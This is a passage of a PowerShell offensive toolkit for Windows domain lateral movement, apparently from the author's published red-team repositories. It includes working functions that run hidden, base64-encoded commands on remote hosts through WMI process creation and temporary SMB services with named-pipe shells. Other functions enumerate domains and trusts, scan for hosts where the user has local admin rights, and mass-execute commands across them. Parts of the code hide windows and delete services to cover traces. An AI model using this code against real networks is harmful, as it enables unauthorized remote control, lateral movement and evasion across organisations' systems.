			if($cred){
				$connectionOptions = New-Object System.Management.ConnectionOptions
				if($UserName -AND $Password){
					$connectionOptions.Username = $UserName
					$connectionOptions.Password = $Password
				}
	
				$scope = New-Object System.Management.ManagementScope("\\$ComputerName\root\cimv2", $connectionOptions)
				$scope.Connect()
				
				$createNewClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]::new(), $null)
				$createNewClass["__CLASS"] = $ClassID
				$createNewClass.Properties.Add($KeyID, [System.Management.CimType]::String, $false)
				$createNewClass.Properties[$KeyID].Qualifiers.Add("Key", $true)
				$createNewClass.Properties.Add("OutputData", [System.Management.CimType]::String, $false)
				$createNewClass.Properties.Add("CommandStatus", [System.Management.CimType]::String, $false)
				$createNewClass.Put() | Out-Null
			}
			else{
				$createNewClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2", [string]::Empty, $null)
				$createNewClass["__CLASS"] = $ClassID
				$createNewClass.Properties.Add($KeyID, [System.Management.CimType]::String, $false)
				$createNewClass.Properties[$KeyID].Qualifiers.Add("Key", $true)
				$createNewClass.Properties.Add("OutputData", [System.Management.CimType]::String, $false)
				$createNewClass.Properties.Add("CommandStatus", [System.Management.CimType]::String, $false)
				$createNewClass.Put() | Out-Null
			}
		}
  	} catch {Write-Output "[-] Access Denied"; Write-Output ""; break}
	
	try{
		if($cred){$wmiData = Set-WmiInstance -Class $ClassID -ComputerName $ComputerName -Credential $cred}
		else{$wmiData = Set-WmiInstance -Class $ClassID -ComputerName $ComputerName}
		
		$wmiData.GetType() | Out-Null
		$GuidOutput = ($wmiData | Select-Object -Property $KeyID -ExpandProperty $KeyID)
		$wmiData.Dispose()
  	} catch {Write-Output "[-] Access Denied"; Write-Output ""; break}


	$RunCmd = {
	        param ([string]$CmdInput)
		$resultData = $null
		$wmiDataOutput = $null
	        $base64Input = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($CmdInput))
	        $commandStr = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $base64Input"
	        $finalCommand = "`$outputData = &$commandStr | Out-String; Get-WmiObject -Class $ClassID -Filter `"$KeyID = '$GuidOutput'`" | Set-WmiInstance -Arguments `@{OutputData = `$outputData; CommandStatus='Completed'} | Out-Null"
	        $finalCommandBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalCommand))
	        if($cred){$startProcess = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -Credential $cred -ArgumentList ("powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $finalCommandBase64)}
		else{$startProcess = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList ("powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $finalCommandBase64)}
	
	        if ($startProcess.ReturnValue -ne 0) {
			throw "Failed to start process on $ComputerName. Return value: $($startProcess.ReturnValue)"
			return
		}
			
		if ($startProcess.ReturnValue -eq 0) {
			$elapsedTime = 0
			$timeout = 60
			do {
				Start-Sleep -Seconds 1
				$elapsedTime++
				if($cred){$wmiDataOutput = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -Credential $cred -Filter "$KeyID = '$GuidOutput'"}
				else{$wmiDataOutput = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -Filter "$KeyID = '$GuidOutput'"}
				if ($wmiDataOutput.CommandStatus -eq "Completed") {
					break
				}
			} while ($elapsedTime -lt $timeout)
			$resultData = $wmiDataOutput.OutputData
			$wmiDataOutput.CommandStatus = "NotStarted"
			$wmiDataOutput.Put() | Out-Null
			$wmiDataOutput.Dispose()
			return $resultData
	        } 
		else {
			throw "Failed to run command on $ComputerName."
			return
	        }
	}

	if ($Command) {
		$finalResult = & $RunCmd -CmdInput $Command
		Write-Output $finalResult
	} 
	else {
	        do {
	            [Console]::Write("[$ComputerName]: PS:\>")
				$inputFromUser = Read-Host
	            if ($inputFromUser -eq 'exit') {
	                Write-Output ""
	                break
	            }
	            if ($inputFromUser) {
	                $finalResult = & $RunCmd -CmdInput $inputFromUser
	                Write-Output $finalResult
	            }
	        } while ($true)
	}
	
	
	if($cred){
		# Create a CimSession with the provided credentials
		if($UserName -AND $Password) {
			$sessionOptions = New-CimSessionOption -Protocol Dcom
			$cimSession = New-CimSession -Credential $cred -ComputerName $ComputerName -SessionOption $sessionOptions
		} 
  		else {$cimSession = New-CimSession -ComputerName $ComputerName}

		# Use the CimSession to delete the class
		$cimInstance = Get-CimInstance -Namespace "ROOT\CIMV2" -ClassName $ClassID -CimSession $cimSession -ErrorAction SilentlyContinue
		if ($cimInstance) {Remove-CimInstance -CimInstance $cimInstance}

		# Optionally, remove the session when done
		$cimSession | Remove-CimSession
	}
	else{([wmiclass]"\\$ComputerName\ROOT\CIMV2:$ClassID").Delete()}
}
'@

$SmbScript = @'
function Invoke-SMBRemoting {
	
	<#

	.SYNOPSIS
	Invoke-SMBRemoting Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-SMBRemoting
	
	#>

	param (
		[string]$PipeName,
		[string]$ComputerName,
		[string]$ServiceName,
		[string]$Command,
		[string]$Timeout = "30000",
		[switch]$Verbose
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	Set-Variable MaximumHistoryCount 32767
	
	if (-not $ComputerName) {
		Write-Output " [-] Please specify a Target"
		return
	}
	
	if(!$PipeName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$PipeName = $randomvalue
	}
	
	if(!$ServiceName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$ServiceName = "Service_" + $randomvalue
	}
	
	$ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
`$pipeServer.WaitForConnection()
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
	if (-not `$pipeServer.IsConnected) {
		break
	}
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break} 
	else {
		try{
			`$result = Invoke-Expression `$command | Out-String
			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} catch {
			`$errorMessage = `$_.Exception.Message
			`$sw.WriteLine(`$errorMessage)
		}
		`$sw.WriteLine("###END###")
		`$sw.Flush()
	}
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
	
	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	
	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
	
	$startarguments = "\\$ComputerName start $ServiceName"
	
	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
	
	Start-Sleep -Milliseconds 1000
	
	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
	if($Verbose){
		Write-Output ""
		Write-Output " [+] Pipe Name: $PipeName"
		Write-Output ""
		Write-Output " [+] Service Name: $ServiceName"
		Write-Output ""
		Write-Output " [+] Creating Service on Remote Target..."
	}
	#Write-Output ""
	
	# Get the current process ID
	$currentPID = $PID
	
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@
	
	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
	# Execute the embedded monitoring script in a hidden window
	Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
	
	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
	
 	try {
		$pipeClient.Connect($Timeout)
	} catch [System.TimeoutException] {
		Write-Output "[$($ComputerName)]: Connection timed out"
		Write-Output ""
		return
	} catch {
		Write-Output "[$($ComputerName)]: An unexpected error occurred"
		Write-Output ""
		return
	}

	$sr = New-Object System.IO.StreamReader($pipeClient)
	$sw = New-Object System.IO.StreamWriter($pipeClient)

	$serverOutput = ""
	
	if ($Command) {
		$fullCommand = "$Command 2>&1 | Out-String"
		$sw.WriteLine($fullCommand)
		$sw.Flush()
		while ($true) {
			$line = $sr.ReadLine()
			if ($line -eq "###END###") {
				Write-Output $serverOutput.Trim()
				Write-Output ""
				return
			} else {
				$serverOutput += "$line`n"
			}
		}
	} 
	
	else {
		while ($true) {
			
			# Fetch the actual remote prompt
			$sw.WriteLine("prompt | Out-String")
			$sw.Flush()
			
			$remotePath = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "###END###") {
					# Remove any extraneous whitespace, newlines etc.
					$remotePath = $remotePath.Trim()
					break
				} else {
					$remotePath += "$line`n"
				}
			}
			
			$ipPattern = '^\d{1,3}(\.\d{1,3}){3}$'
   			if($ComputerName -match $ipPattern){$computerNameOnly = $ComputerName}
      			else{$computerNameOnly = $ComputerName -split '\.' | Select-Object -First 1}
			$promptString = "[$computerNameOnly]: $remotePath "
			[Console]::Write($promptString)
			$userCommand = Read-Host
			
			if ($userCommand -eq "exit") {
				Write-Output ""
					$sw.WriteLine("exit")
				$sw.Flush()
				break
			}
			
			elseif($userCommand -ne ""){
				$fullCommand = "$userCommand 2>&1 | Out-String"
				$sw.WriteLine($fullCommand)
				$sw.Flush()
			}
			
			else{
				continue
			}
			
			#Write-Output ""

			$serverOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "###END###") {
					Write-Output $serverOutput.Trim()
					Write-Output ""
					break
				} else {
					$serverOutput += "$line`n"
				}
			}
		}
	}

	$stoparguments = "\\$ComputerName delete $ServiceName"
	Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
	$pipeClient.Close()
	$pipeClient.Dispose()
}
'@

function Find-LocalAdminAccess {
	
	<#

	.SYNOPSIS
	Find-LocalAdminAccess Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Find-LocalAdminAccess

	
	#>
	
    	param (
        	[string]$Targets,
		[Parameter(Mandatory=$true)]
        	[string]$Method,
        	[string]$UserName,
        	[string]$Password,
		[string]$Command,
  		[string]$Domain,
    		[string]$DomainController,
		[switch]$ShowErrors,
		[switch]$scsafe,
		[switch]$NoOutput,
  		[switch]$SaveOutput,
    		[switch]$InLine
    	)
	if(!$ShowErrors){
		$ErrorActionPreference = "SilentlyContinue"
		$WarningPreference = "SilentlyContinue"
	}
	
	Set-Variable MaximumHistoryCount 32767

    	if (($UserName -OR $Password) -AND ($Method -eq "SMB")) {
        	Write-Output "Please use Method WMI or PSRemoting if you need to run as a different user"
        	return
    	}

    	if ($Targets) {
     		$TestPath = Test-Path $Targets
		
		if($TestPath){
			$Computers = Get-Content -Path $Targets
			$Computers = $Computers | Sort-Object -Unique
		}
		
		else{
			$Computers = $Targets
			$Computers = $Computers -split ","
			$Computers = $Computers | Sort-Object -Unique
		}
    	} else {
		# All Domains
		$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
		if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
		if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
		if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
		
		$ParentDomain = ($FindCurrentDomain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name)
		$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $ParentDomain)
		$ChildContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
		$ChildDomains = @($ChildContext | Select-Object -ExpandProperty Children | Select-Object -ExpandProperty Name)
		
		$AllDomains = @($ParentDomain)
		
		if($ChildDomains){
			foreach($ChildDomain in $ChildDomains){
				$AllDomains += $ChildDomain
			}
		}
		
		# Trust Domains (save to variable)
		$TrustTargetNames = @(foreach($AllDomain in $AllDomains){(FindDomainTrusts -Domain $AllDomain).TargetName})
		$TrustTargetNames = $TrustTargetNames | Sort-Object -Unique
		$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -notin $AllDomains }
		
		# Remove Outbound Trust from $AllDomains
		$OutboundTrusts = @(foreach($AllDomain in $AllDomains){FindDomainTrusts -Domain $AllDomain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName})
		
		
		foreach($TrustTargetName in $TrustTargetNames){
			$AllDomains += $TrustTargetName
		}
		
		$AllDomains = $AllDomains | Sort-Object -Unique
		
		$PlaceHolderDomains = $AllDomains
		$AllDomains = $AllDomains | Where-Object { $_ -notin $OutboundTrusts }
		
		### Remove Unreachable domains
		$ReachableDomains = $AllDomains

		foreach($AllDomain in $AllDomains){
			$ReachableResult = $null
			$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $AllDomain)
			$ReachableResult = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
			if($ReachableResult){}
			else{$ReachableDomains = $ReachableDomains | Where-Object { $_ -ne $AllDomain }}
		}

		$AllDomains = $ReachableDomains
		
		$Computers = @()
		foreach($AllDomain in $AllDomains){
			$Computers += Get-ADComputers -ADCompDomain $AllDomain
		}
		$Computers = $Computers | Sort-Object
    	}

    	$Computers = $Computers | Where-Object { $_ -and $_.trim() }
	$HostFQDN = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
	$TempHostname = $HostFQDN -replace '\..*', ''
	$Computers = $Computers | Where-Object {$_ -ne "$HostFQDN"}
	$Computers = $Computers | Where-Object {$_ -ne "$TempHostname"}
	
	if($Method -eq "WMI"){$PortScan = 135}
	elseif($Method -eq "SMB"){$PortScan = 445}
	elseif($Method -eq "PSRemoting"){$PortScan = 5985}
	
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	$scriptBlock = {
		param ($computer, $port)
		$tcpClient = New-Object System.Net.Sockets.TcpClient
		$asyncResult = $tcpClient.BeginConnect($computer, $port, $null, $null)
		$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
		if ($wait) {
			try {
				$tcpClient.EndConnect($asyncResult)
				return $computer
			} catch {}
		}
		$tcpClient.Close()
		return $null
	}

	$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'

	foreach ($computer in $Computers) {
		$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer).AddArgument($PortScan)
		$powerShellInstance.RunspacePool = $runspacePool
		$runspaces.Add([PSCustomObject]@{
			Instance = $powerShellInstance
			Status   = $powerShellInstance.BeginInvoke()
		})
	}

	$reachable_hosts = @()
	foreach ($runspace in $runspaces) {
		$result = $runspace.Instance.EndInvoke($runspace.Status)
		if ($result) {
			$reachable_hosts += $result
		}
	}

	$Computers = $reachable_hosts
	
	#$Computers = $Computers | Sort-Object -Unique

	$runspacePool.Close()
	$runspacePool.Dispose()
	
	if($UserName){
		Write-Output ""
		Write-Output "[+] $UserName has Local Admin access on:"
		Write-Output ""
	}
	else{
		Write-Output ""
		Write-Output "[+] The current user has Local Admin access on:"
		Write-Output ""
	}

    	$ScriptBlock = {
		param (
			$Computer,
			$Method,
			$UserName,
			$Password
		)
		
		if($UserName -AND $Password){
			$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
			$cred = New-Object System.Management.Automation.PSCredential($UserName, $SecPassword)
		}
		
		$Error.Clear()

		if ($UserName -AND $Password -AND ($Method -eq "WMI")) {Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue -Credential $cred}
  		elseif ($UserName -AND $Password -AND ($Method -eq "PSRemoting")) {Invoke-Command -ScriptBlock { hostname } -ComputerName $Computer -ErrorAction SilentlyContinue -Credential $cred}
    		elseif ($Method -eq "WMI") {Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue}
      		elseif ($Method -eq "PSRemoting") {Invoke-Command -ScriptBlock { hostname } -ComputerName $Computer -ErrorAction SilentlyContinue}
		elseif ($Method -eq "SMB") {ls \\$Computer\c$ -ErrorAction SilentlyContinue}
		if($error[0] -eq $null) {
			return @{
		    	Computer = $Computer
		    	Success  = $true
			}
	    } else {
			return @{
		    	Computer = $Computer
		    	Success  = $false
		    	Message  = $error[0].ToString()
			}
	    }
	}

    	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
    	$runspacePool.Open()
    	$runspaces = New-Object System.Collections.ArrayList

    	foreach ($Computer in $Computers) {
        	$runspace = [powershell]::Create().AddScript($ScriptBlock).AddArgument($Computer).AddArgument($Method).AddArgument($UserName).AddArgument($Password)
        	$runspace.RunspacePool = $runspacePool
        	$null = $runspaces.Add([PSCustomObject]@{
            		Pipe = $runspace
            		Status = $runspace.BeginInvoke()
        	})
    	}

    	$ComputerAccess = @()
		foreach ($run in $runspaces) {
			try {
				$result = $run.Pipe.EndInvoke($run.Status)
			} catch {}
			if ($result.Success) {
				$ComputerAccess += $result.Computer
			} else {
				Write-Warning "[-] Failed on $($result.Computer): $($result.Message)"
			}
		}

    	$runspaces | ForEach-Object {
        	$_.Pipe.Dispose()
    	}

    	$runspacePool.Close()
    	$runspacePool.Dispose()

 	#$ComputerAccess = $ComputerAccess | Sort-Object -Unique
	
	if($ComputerAccess){
		$ComputerAccess = $ComputerAccess | Where-Object { $_ }
		if($InLine){$LineComputerAccess = $ComputerAccess;$LineComputerAccess = $LineComputerAccess -Join ",";Write-Output $LineComputerAccess}
		else{$ComputerAccess | ForEach-Object { Write-Output $_ }}
	}
  	else{Write-Output "[-] No Access"}
		
	if($SaveOutput){
	    	try {
	        	$ComputerAccess | Out-File $PWD\LocalAdminAccess.txt -Force
	        	Write-Output ""
			Write-Output "[+] Output saved to: $PWD\LocalAdminAccess.txt"
			Write-Output ""
	    	} catch {
	        	$ComputerAccess | Out-File "c:\Users\Public\Documents\LocalAdminAccess.txt" -Force
			Write-Output ""
	        	Write-Output "[+] Output saved to: c:\Users\Public\Documents\LocalAdminAccess.txt"
			Write-Output ""
	    	}
	} else {Write-Output ""}
	
	if ($Command) {

		if ($UserName -and $Password) {
			$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
			$cred = New-Object System.Management.Automation.PSCredential($UserName, $SecPassword)
		}

		if ($Method -eq 'SMB') {
			# Initialize a mutex to synchronize access to sc.exe operations
			if($scsafe){
				$Mutex = [System.Threading.Mutex]::new($false, 'SCMutex')
			}
		}

		# Create and open a runspace pool
		$RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, [System.Environment]::ProcessorCount)
		$RunspacePool.Open()

		$scriptBlock = {
			param($Computer, $Command, $Method, $cred, $Username, $Password, $WmiScript, $SmbScript)

			try {
				if ($Method -eq 'PSRemoting') {
					if ($cred) {
						$command = $command + " | Out-String -Width 4096"
						$output = Invoke-Command -ScriptBlock { Invoke-Expression $Using:Command } -ComputerName $Computer -Credential $cred
					}
					else {
     						$command = $command + " | Out-String -Width 4096"
						$output = Invoke-Command -ScriptBlock { Invoke-Expression $Using:Command } -ComputerName $Computer
					}
				}
				elseif ($Method -eq 'WMI') {
					. ([ScriptBlock]::Create($WmiScript))
					if ($cred) {
						$output = Invoke-WMIRemoting -ComputerName $Computer -Command $Command -Username $Username -Password $Password
					}
					else {
						$output = Invoke-WMIRemoting -ComputerName $Computer -Command $Command
					}
				}
				elseif ($Method -eq 'SMB') {
					. ([ScriptBlock]::Create($SmbScript))
					$output = Invoke-SMBRemoting -ComputerName $Computer -Command $Command
				}

				return @{
					ComputerName = $Computer
					Output       = $output
				}
			} catch {
				return @{
					ComputerName = $Computer
					Error        = $_.Exception.Message
				}
			}
		}

		$JobObjects = @()
		
		if ($Method -eq 'SMB' -AND $scsafe) {
			foreach ($Computer in $ComputerAccess) {
				[void]$Mutex.WaitOne()
				try {
					$Job = [PowerShell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Command).AddArgument($Method).AddArgument($cred).AddArgument($Username).AddArgument($Password).AddArgument($WmiScript).AddArgument($SmbScript)
					$Job.RunspacePool = $RunspacePool
					$JobObjects += @{
						PowerShell = $Job
						Handle     = $Job.BeginInvoke()
					}
				} finally {
					$Mutex.ReleaseMutex()
				}
			}
		}
		
		else{

			foreach ($Computer in $ComputerAccess) {
				$Job = [PowerShell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Command).AddArgument($Method).AddArgument($cred).AddArgument($Username).AddArgument($Password).AddArgument($WmiScript).AddArgument($SmbScript)
				$Job.RunspacePool = $RunspacePool
				$JobObjects += @{
					PowerShell = $Job
					Handle     = $Job.BeginInvoke()
				}
			}
		}

		# Wait for all jobs to complete
		if(!$NoOutput){
			$JobObjects | ForEach-Object { $_.Handle.AsyncWaitHandle.WaitOne() } > $null

			foreach ($Job in $JobObjects) {
				$Result = $Job.PowerShell.EndInvoke($Job.Handle)
				
				if ($Result.Error) {
					Write-Output "$($Result.ComputerName): Error - $($Result.Error)"
				} else {
					Write-Output "[+] $($Result.ComputerName)"
					Write-Output "$($Result.Output.TrimEnd())"
					Write-Output ""
					Write-Output ""
				}
				
				$Job.PowerShell.Dispose()
			}
			
			$RunspacePool.Close()
		}
		
		if ($Method -eq 'SMB' -AND $scsafe) {
			# Release the mutex
			$Mutex.Dispose()
		}
		
		Write-Output "[+] Command execution completed"
		Write-Output ""
	}
}

function CheckAdminAccess {
	
	param (
		[string]$Domain,
		[string]$DomainController,
		[string]$Targets,
		[switch]$SkipPortScan
    )

 	if(!$global:AllUserDefinedTargets){
		if($Targets){
			
			$TestPath = Test-Path $Targets
			
			if($TestPath){
				$Computers = Get-Content -Path $Targets
				$Computers = $Computers | Sort-Object -Unique
			}
			
			else{
				$Computers = $Targets
				$Computers = $Computers -split ","
				$Computers = $Computers | Sort-Object -Unique
			}
		}
		
		else{
			
			# All Domains
			$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
			if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
			if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
			if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
			
			$ParentDomain = ($FindCurrentDomain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name)
			$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $ParentDomain)
			$ChildContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
			$ChildDomains = @($ChildContext | Select-Object -ExpandProperty Children | Select-Object -ExpandProperty Name)
			
			$AllDomains = @($ParentDomain)
			
			if($ChildDomains){
				foreach($ChildDomain in $ChildDomains){
					$AllDomains += $ChildDomain
				}
			}
			
			# Trust Domains (save to variable)
			$TrustTargetNames = @(foreach($AllDomain in $AllDomains){(FindDomainTrusts -Domain $AllDomain).TargetName})
			$TrustTargetNames = $TrustTargetNames | Sort-Object -Unique
			$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -notin $AllDomains }
			
			# Remove Outbound Trust from $AllDomains
			$OutboundTrusts = @(foreach($AllDomain in $AllDomains){FindDomainTrusts -Domain $AllDomain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName})
			
			
			foreach($TrustTargetName in $TrustTargetNames){
				$AllDomains += $TrustTargetName
			}
			
			$AllDomains = $AllDomains | Sort-Object -Unique
			
			$PlaceHolderDomains = $AllDomains
			$AllDomains = $AllDomains | Where-Object { $_ -notin $OutboundTrusts }
			
			### Remove Unreachable domains
			$ReachableDomains = $AllDomains
	
			foreach($AllDomain in $AllDomains){
				$ReachableResult = $null
				$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $AllDomain)
				$ReachableResult = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
				if($ReachableResult){}
				else{$ReachableDomains = $ReachableDomains | Where-Object { $_ -ne $AllDomain }}
			}
	
			$AllDomains = $ReachableDomains
			
			$Computers = @()
			foreach($AllDomain in $AllDomains){
				$Computers += Get-ADComputers -ADCompDomain $AllDomain
			}
			$Computers = $Computers | Sort-Object
			
		}
 	}
  	else{$Computers = $global:AllUserDefinedTargets}

 	$Computers = $Computers | Where-Object { $_ -and $_.trim() }
	
	if(!$SkipPortScan){
		# Initialize the runspace pool
		$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
		$runspacePool.Open()

		# Define the script block outside the loop for better efficiency
		$scriptBlock = {
			param ($computer)
			$tcpClient = New-Object System.Net.Sockets.TcpClient
			$asyncResult = $tcpClient.BeginConnect($computer, 445, $null, $null)
			$wait = $asyncResult.AsyncWaitHandle.WaitOne(100)
			if ($wait) {
				try {
					$tcpClient.EndConnect($asyncResult)
					return $computer
				} catch {}
			}
			$tcpClient.Close()
			return $null
		}

		# Use a generic list for better performance when adding items
		$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'

		foreach ($computer in $Computers) {
			$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
			$powerShellInstance.RunspacePool = $runspacePool
			$runspaces.Add([PSCustomObject]@{
				Instance = $powerShellInstance
				Status   = $powerShellInstance.BeginInvoke()
			})
		}

		# Collect the results
		$reachable_hosts = @()
		foreach ($runspace in $runspaces) {
			$result = $runspace.Instance.EndInvoke($runspace.Status)
			if ($result) {
				$reachable_hosts += $result
			}
		}

		# Update the $Computers variable with the list of reachable hosts
		$Computers = $reachable_hosts

		# Close and dispose of the runspace pool for good resource management
		$runspacePool.Close()
		$runspacePool.Dispose()
	}
	
	else{
 		$reachable_hosts = $null
		$reachable_hosts = @()
 		$reachable_hosts = $Computers
   	}
	
 	$HostFQDN = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
	$reachable_hosts = $reachable_hosts | Where-Object {$_ -ne $HostFQDN}
	$global:AllOurTargets = $reachable_hosts
	
	# Initialize the runspace pool
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()
	
	# Define the script block
	$scriptBlock = {
	    param ($Computer)
	
	    # Clear error listing
	    $Error.clear()
	
	    ls \\$Computer\c$ > $null
	
	    $ourerror = $error[0]
	    
	    if (($ourerror) -eq $null) {
	        return $Computer
	    } else {
	        return $null
	    }
	}
	
	# Create the runspaces list
	$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'
	
	foreach ($computer in $reachable_hosts) {
	    $powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
	    $powerShellInstance.RunspacePool = $runspacePool
	    $runspaces.Add([PSCustomObject]@{
	        Instance = $powerShellInstance
	        Status   = $powerShellInstance.BeginInvoke()
	    })
	}
	
	# Collect the results
	$ComputerAccess = @()
	foreach ($runspace in $runspaces) {
	    $result = $runspace.Instance.EndInvoke($runspace.Status)
	    if ($result) {
	        $ComputerAccess += $result
	    }
	}
	
	$ComputerAccess
	
	# Close and dispose of the runspace pool
	$runspacePool.Close()
	$runspacePool.Dispose()
	
}

function Choose-And-Interact {

	param (
		[string]$PipeName,
		[string]$Target,
		[string]$ServiceName,
		[string]$Command,
		[string]$Timeout
	)
	
	if (-not $Target) {
		Write-Output " [-] Please specify a target"
		return
	}
	
	if(!$PipeName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$PipeName = $randomvalue
	}
	
	if(!$ServiceName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$ServiceName = "Service_" + $randomvalue
	}
	
	$ComputerName = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
	
	$ClientScript = @"
`$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", "$PipeName", 'InOut')
`$sr = New-Object System.IO.StreamReader(`$pipeClient)
`$sw = New-Object System.IO.StreamWriter(`$pipeClient)
`$pipeClient.Connect(600000)
`$sw.WriteLine("`$env:COMPUTERNAME,`$(Get-Location)")
`$sw.Flush()
while (`$true) {
	Start-Sleep -Milliseconds 100
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break}
	try {
		`$result = Invoke-Expression "`$command 2>&1 | Out-String"
		`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
	} catch {
		`$errorMessage = `$_.Exception.Message
		`$errorMessage -split "`r?`n" | ForEach-Object {`$sw.WriteLine(`$_)}
	}
	`$sw.WriteLine("#END#")
	`$sw.Flush()
}
`$pipeClient.Close()
